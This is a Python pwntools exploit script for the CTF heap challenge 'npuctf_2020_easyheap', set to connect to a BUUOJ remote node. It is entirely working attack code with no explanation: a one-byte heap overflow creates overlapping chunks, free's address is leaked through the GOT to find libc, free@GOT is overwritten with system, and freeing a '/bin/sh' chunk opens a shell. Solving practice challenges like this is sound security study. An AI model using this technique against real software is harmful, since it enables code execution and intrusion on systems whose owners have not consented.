from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')
libc = ELF('./libc.so.6')
ld = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so')
elf = ELF("./npuctf_2020_easyheap")
#sh = process(elf.path)
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
sh = remote('node4.buuoj.cn', 25184)
#gdb.attach(sh)

atoi_got = elf.got['atoi']
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil(b'Your choice :')
    sh.sendline('1')
    sh.recvuntil(b'Size of Heap(0x10 or 0x20 only) : ')
    sh.sendline(str.encode(str(size)))
    sh.recvuntil(b'Content:')
    sh.sendline(content)

def edit(size, content):
    sh.recvuntil(b'Your choice :')
    sh.sendline('2')
    sh.recvuntil(b'Index :')
    sh.sendline(str.encode(str(size)))
    sh.recvuntil(b'Content: ')
    sh.sendline(content)
    pass

def show(size):
    sh.recvuntil(b'Your choice :')
    sh.sendline('3')
    sh.recvuntil(b'Index :')
    sh.sendline(str.encode(str(size)))
    pass

def delete(size):
    sh.recvuntil(b'Your choice :')
    sh.sendline('4')
    sh.recvuntil(b'Index :')
    sh.sendline(str.encode(str(size)))
    pass

def exit():
    sh.recvuntil(b'Your choice :')
    sh.sendline('5')
    pass

add(0x18,b'aaaa')
add(0x18,b'bbbb')
add(0x18,b'/bin/sh')
edit(0,b'a' * 0x18 + b'\x41')
delete(1)
payload = b'a' * 0x10 + p64(0) + p64(0x21) + p64(0x100) + p64(free_got)
add(0x38,payload)
show(1)
sh.recvuntil(b"Content : ")
free_addr =  u64(sh.recvuntil(b'\x7f').ljust(8,b'\x00'))
log.success("free_addr : " + hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.success("libc base addr :" + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1,p64(system_addr))
delete(2)











sh.interactive()
